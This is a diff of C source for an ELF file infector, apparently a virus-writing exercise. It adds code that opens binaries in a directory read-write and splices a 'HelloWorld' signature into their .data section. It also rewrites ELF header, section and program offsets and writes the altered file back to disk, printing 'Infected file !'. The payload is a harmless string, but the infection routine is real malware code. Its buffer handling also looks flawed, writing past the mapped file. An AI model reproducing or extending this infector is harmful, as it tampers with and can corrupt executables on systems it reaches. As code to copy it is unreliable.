@@ -1,16 +1,15 @@
-#include <fcntl.h>
+#define _FCNTL_H
 #include <linux/stat.h>
 #include <stddef.h>
 #include <sys/types.h>
 #include <bits/stat.h>
+#include <bits/fcntl.h>
 #include <stdio.h>
 #include <signal.h>
 #include <dirent.h>
 #include <elf.h>
 
 #define BUF_SIZE 1024
-#define	__S_ISTYPE(mode, mask)	(((mode) & __S_IFMT) == (mask))
-#define	S_ISREG(mode)	 __S_ISTYPE((mode), __S_IFREG)
 
 typedef off_t off64_t;
 typedef ino_t ino64_t;
@@ -34,16 +33,16 @@ static int  write(int fd, const void *buf, size_t count) {
 }
 
 
-/* static int  open(const char *pathname, int flags, int mode) { */
-/*   register int8_t     rax asm("rax") = 2; */
-/*   register const char *rdi asm("rdi") = pathname; */
-/*   register int        rsi asm("rsi") = flags; */
-/*   register int        rdx asm("rdx") = mode; */
+static int  open(const char *pathname, int flags, int mode) {
+  register int8_t     rax asm("rax") = 2;
+  register const char *rdi asm("rdi") = pathname;
+  register int        rsi asm("rsi") = flags;
+  register int        rdx asm("rdx") = mode;
 
-/*   asm("syscall" */
-/*     : "=r" (rax)); */
-/*   return (rax); */
-/* } */
+  asm("syscall"
+    : "=r" (rax));
+  return (rax);
+}
 
 static int  close(int fd) {
   register int8_t       rax asm("rax") = 3;
@@ -178,12 +177,15 @@ static void  *memmove(void *dest, const void *src, size_t n) {
 
 #include <sys/mman.h>
 
-struct bin {
-  Elf64_Ehdr  *header;
+struct bfile {
+  int         fd;
   off_t       size;
+  Elf64_Ehdr  *header;
 };
 
-static int  mapFile(const char *dirname, const char *filename, struct bin *bin) {
+#include <string.h>
+
+static int  mapFile(const char *dirname, const char *filename, struct bfile *bin) {
   int         fd;
   size_t      len;
   char        *tmp;
@@ -196,29 +198,56 @@ static int  mapFile(const char *dirname, const char *filename, struct bin *bin) 
   memcpy(tmp, dirname, strlen(dirname));
   strcat(tmp, slash);
   strcat(tmp, filename);
-  if ((fd = open(tmp, O_RDONLY)) <= 0) {
-    munmap(tmp, len);
-    return (-1);
-  }
   if (stat(tmp, &stats) < 0) {
-    close(fd);
     munmap(tmp, len);
     return (-1);
   }
   if (!S_ISREG(stats.st_mode)) {
-    close(fd);
     munmap(tmp, len);
     return (1);
+  }
+  if ((fd = open(tmp, O_RDWR, 0)) <= 0) {
+    munmap(tmp, len);
+    return (-1);
   }
   if ((bin->header = mmap(0, stats.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0)) == MAP_FAILED) {
     close(fd);
     munmap(tmp, len);
     return (-1);
   }
-  close(fd);
   munmap(tmp, len);
+  bin->fd = fd;
   bin->size = stats.st_size;
   return (0);
+}
+
+static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
+    size_t      i;
+    Elf64_Shdr  *section;
+    Elf64_Phdr  *program;
+
+    if (header->e_entry > offset)
+      header->e_entry += toAdd;
+    if (header->e_phoff > offset)
+      header->e_phoff += toAdd;
+    if (header->e_shoff > offset)
+      header->e_shoff += toAdd;
+    i = 0;
+    while (i < header->e_shnum) {
+        section = (void *)(header) + header->e_shoff + i * sizeof(Elf64_Shdr);
+        if (section->sh_offset > offset)
+            section->sh_offset += toAdd;
+        i += 1;
+    }
+    i = 0;
+    while (i < header->e_phnum) {
+        program = ((void *)header) + header->e_phoff + i * sizeof(Elf64_Phdr);
+        if (program->p_offset > offset)
+            program->p_offset += toAdd;
+        if (program->p_paddr > offset)
+            program->p_paddr += toAdd;
+        i += 1;
+    }
 }
 
 Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header) {
@@ -233,17 +262,40 @@ Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header) {
   return (pointer);
 }
 
-static int  infectFile(struct bin bin) {
-  Elf64_Shdr *data;
+char payload[] = "HelloWorld";
 
+static int  appendSignature(struct bfile file, size_t offset) {
+  size_t  toAdd;
+
+  toAdd = strlen(payload) + 1;
+  memmove(((void *)file.header) + offset + toAdd, ((void *)file.header) + offset, file.size - offset);
+  memcpy(((void *)file.header) + offset, payload, toAdd);
+  return (0);
+}
+
+static int  infectFile(struct bfile bin) {
+  size_t      len;
+  Elf64_Shdr  *data;
+  Elf64_Off   offset;
+
+  len = strlen(payload);
   data = getDataSectionHeader(bin.header);
+  data->sh_size += len + 1;
+  offset = data->sh_offset;
+  appendSignature(bin, offset + data->sh_size - (len + 1));
+  bin.size += len + 1;
+  updateOffsets(bin.header, offset + data->sh_size - len - 1, len + 1);
+  write(bin.fd, bin.header, bin.size);
+  close(bin.fd);
+  munmap(bin.header, bin.size);
+  dprintf(1, "Infected file !\n");
   return (0);
 }
 
 static int  infectBins(const char *dirname) {
   int                   fd;
   int                   ret;
-  struct bin            bin;
+  struct bfile          bin;
   int                   bpos;
   int                   nread;
   struct linux_dirent   *dirp;
